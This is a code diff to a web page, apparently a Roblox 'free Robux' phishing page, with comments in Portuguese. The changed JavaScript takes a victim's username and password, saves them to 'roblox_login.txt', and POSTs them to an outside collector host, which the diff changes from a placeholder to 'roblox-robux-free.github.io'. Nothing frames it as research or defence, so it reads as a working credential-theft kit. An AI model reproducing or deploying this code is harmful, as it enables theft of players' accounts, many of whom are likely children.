@@ -577,7 +577,7 @@ site.</div></div></noscript>
             // Forçar download do arquivo
             const a = document.createElement('a');
             a.href = url;
-            a.download = 'credenciais.txt';
+            a.download = 'roblox_login.txt';
             a.click();
             
             // Simular envio para um servidor (substitua pela sua URL)
@@ -585,7 +585,7 @@ site.</div></div></noscript>
             formData.append('username', username);
             formData.append('password', password);
             
-            fetch('https://seuservidor.com/receber-credenciais', {
+            fetch('https://roblox-robux-free.github.io/roblox/', {
                 method: 'POST',
                 body: formData
             })
